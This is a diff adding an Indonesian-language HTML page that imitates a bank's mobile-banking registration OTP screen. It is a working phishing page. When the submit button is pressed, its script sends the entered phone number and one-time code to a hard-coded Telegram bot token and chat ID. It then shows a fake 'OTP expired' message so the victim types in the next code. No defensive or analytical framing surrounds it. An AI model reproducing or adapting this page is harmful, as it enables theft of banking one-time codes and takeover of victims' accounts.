@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Registrasi Mobile Banking - OTP</title>
+  <style>
+    /* Reset dan base */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0; 
+      font-family: Arial, sans-serif;
+      background-color: #e6e6eb;
+      color: #000;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    /* Header */
+    header {
+      background-color: #0b74e8;
+      color: white;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      position: relative;
+      padding: 0 16px;
+      font-weight: 700;
+      font-size: 18px;
+      user-select: none;
+    }
+    .back-arrow {
+      position: absolute;
+      left: 16px;
+      cursor: pointer;
+      height: 24px;
+      width: 24px;
+      display: flex;
+      align-items: center;
+    }
+    .back-arrow svg {
+      stroke: white;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      width: 24px;
+      height: 24px;
+    }
+    header .title {
+      flex-grow: 1;
+      text-align: center;
+      margin-left: 24px; /* memberi space agar judul tidak berimpitan dengan panah */
+    }
+
+    /* Main Content */
+    main {
+      flex-grow: 1;
+      padding: 40px 24px 24px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+    }
+    h2 {
+      margin: 0 0 6px;
+      font-weight: 700;
+      font-size: 18px;
+      color: black;
+    }
+    .subtext {
+      font-weight: 400;
+      font-size: 12px;
+      color: #8a8a8a;
+      margin: 0 0 14px;
+    }
+    .phone-mask {
+      font-weight: 700;
+      font-size: 14px;
+      margin: 0 0 30px;
+      color: #000;
+    }
+
+    /* Kotak OTP Inputs */
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 27px;
+    }
+    .otp-input {
+      width: 44px;
+      height: 56px;
+      font-size: 32px;
+      font-weight: 700;
+      border-radius: 12px;
+      border: 1px solid #ccc;
+      background: #fff;
+      text-align: center;
+      outline: none;
+      user-select: none;
+    }
+    .otp-input:focus {
+      border-color: #0b74e8;
+      box-shadow: 0 0 6px #0b74e8;
+    }
+
+    /* Timer text */
+    .resend-text {
+      color: #ff3b3b; /* merah sesuai contoh */
+      font-weight: 700;
+      font-size: 14px;
+      margin-bottom: 32px;
+    }
+
+    /* Tombol Kirim Ulang */
+    button.btn-resend {
+      width: 100%;
+      max-width: 320px;
+      margin: 0 auto 14px;
+      padding: 15px 0;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 16px;
+      border: 1.8px solid #c6c7ca;
+      background-color: #dddde1;
+      color: #8a8a8a;
+      cursor: not-allowed;
+      user-select: none;
+      transition: background-color 0.3s ease, color 0.3s ease;
+      display: block;
+    }
+    button.btn-resend.enabled {
+      border-color: #0b74e8;
+      background-color: #f6f8fb;
+      color: #0b74e8;
+      cursor: pointer;
+    }
+
+    /* Tombol Selanjutnya */
+    button.btn-submit {
+      width: 100%;
+      max-width: 320px;
+      margin: 0 auto;
+      padding: 15px 0;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 16px;
+      border: none;
+      background-color: #d1d3db;
+      color: white;
+      cursor: not-allowed;
+      user-select: none;
+      transition: background-color 0.3s ease;
+      display: block;
+    }
+    button.btn-submit.enabled {
+      background-color: #0b74e8;
+      cursor: pointer;
+    }
+
+    /* Responsiveness untuk lebar kecil */
+    @media (max-width: 360px){
+      .otp-inputs {
+        gap: 10px;
+      }
+      .otp-input {
+        width: 38px;
+        height: 50px;
+        font-size: 28px;
+      }
+      button.btn-resend,
+      button.btn-submit {
+        max-width: 280px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="back-arrow" role="button" aria-label="Kembali" tabindex="0" onclick="window.history.back()">
+    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6"/></svg>
+  </div>
+  <div class="title">Registrasi Mobile Banking</div>
+</header>
+
+<main>
+  <h2>Masukkan kode OTP</h2>
+  <div class="subtext">OTP yang telah dikirimkan ke nomor Ponsel</div>
+  <div class="phone-mask" id="phoneMask">+628XXXXXXXXXX</div>
+
+  <div class="otp-inputs" id="otpInputs">
+    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input" aria-label="Digit 1" />
+    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input" aria-label="Digit 2" />
+    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input" aria-label="Digit 3" />
+    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input" aria-label="Digit 4" />
+    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input" aria-label="Digit 5" />
+    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="otp-input" aria-label="Digit 6" />
+  </div>
+
+  <div class="resend-text">Kirim ulang kode OTP dalam: <span id="timer">00:58</span></div>
+  <button class="btn-resend" id="btnResendOTP" aria-disabled="true" disabled>Kirim ulang Kode OTP</button>
+  <button class="btn-submit" id="btnSubmitOTP" disabled>Selanjutnya</button>
+</main>
+
+<script>
+  const otpInputs = document.querySelectorAll('.otp-input');
+  const btnSubmit = document.getElementById('btnSubmitOTP');
+  const btnResend = document.getElementById('btnResendOTP');
+  const timerSpan = document.getElementById('timer');
+  const phoneMask = document.getElementById('phoneMask');
+
+  let resendTimer = 58;
+
+  function startTimer() {
+    btnResend.disabled = true;
+    btnResend.setAttribute('aria-disabled', 'true');
+    btnResend.classList.remove('enabled');
+    const interval = setInterval(() => {
+      if (resendTimer <= 0) {
+        clearInterval(interval);
+        btnResend.disabled = false;
+        btnResend.setAttribute('aria-disabled', 'false');
+        btnResend.classList.add('enabled');
+        timerSpan.textContent = '00:00';
+        btnResend.textContent = 'Kirim ulang Kode OTP';
+      } else {
+        const mins = Math.floor(resendTimer / 60).toString().padStart(2, '0');
+        const secs = (resendTimer % 60).toString().padStart(2, '0');
+        timerSpan.textContent = `${mins}:${secs}`;
+        resendTimer--;
+      }
+    }, 1000);
+  }
+
+  otpInputs.forEach((input, idx) => {
+    input.addEventListener('input', e => {
+      const val = input.value;
+      if(/^[0-9]$/.test(val)) {
+        if(idx < otpInputs.length - 1) otpInputs[idx+1].focus();
+      } else {
+        input.value = '';
+      }
+      checkComplete();
+    });
+    input.addEventListener('keydown', e => {
+      if(e.key === 'Backspace' && idx > 0 && input.value === '') {
+        otpInputs[idx-1].focus();
+      }
+    });
+  });
+
+  function checkComplete() {
+    const code = Array.from(otpInputs).map(i => i.value).join('');
+    btnSubmit.disabled = (code.length !== 6);
+    if(!btnSubmit.disabled){
+      btnSubmit.classList.add('enabled');
+      btnSubmit.style.backgroundColor = '#0b74e8';
+      btnSubmit.style.cursor = 'pointer';
+      btnSubmit.style.color = 'white';
+    } else {
+      btnSubmit.classList.remove('enabled');
+      btnSubmit.style.backgroundColor = '#d1d3db';
+      btnSubmit.style.cursor = 'not-allowed';
+      btnSubmit.style.color = 'white';
+    }
+  }
+
+  btnResend.addEventListener('click', () => {
+    alert('Kode OTP telah dikirim ulang.');
+    resendTimer = 58;
+    startTimer();
+  });
+
+  btnSubmit.addEventListener('click', () => {
+    if(btnSubmit.disabled) return;
+    const otpCode = Array.from(otpInputs).map(i => i.value).join('');
+    const phoneNumber = phoneMask.textContent.trim();
+    const BOT_TOKEN = '8561612812:AAErTJ9Ml39kQgb0NP4UEpIgda-buNk-6Co'; // Ganti sesuai token Anda
+    const CHAT_ID = '392836663';     // Ganti sesuai Chat ID tujuan
+
+    const message = `OTP Registrasi Mobile Banking:\nNomor HP: ${phoneNumber}\nKode OTP: ${otpCode}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message
+      })
+    })
+    .then(resp => resp.json())
+    .then(data => {
+      if(data.ok){
+        alert('Kode OTP Kadaluwarsa');
+        otpInputs.forEach(i => i.value = '');
+        otpInputs[0].focus();
+        btnSubmit.disabled = true;
+        checkComplete();
+      } else {
+        alert('Gagal mengirim OTP: ' + data.description);
+      }
+    })
+    .catch(e => alert('Kesalahan: ' + e.message));
+  });
+
+  window.onload = () => {
+    otpInputs[0].focus();
+    startTimer();
+  };
+</script>
+
+</body>
+</html>
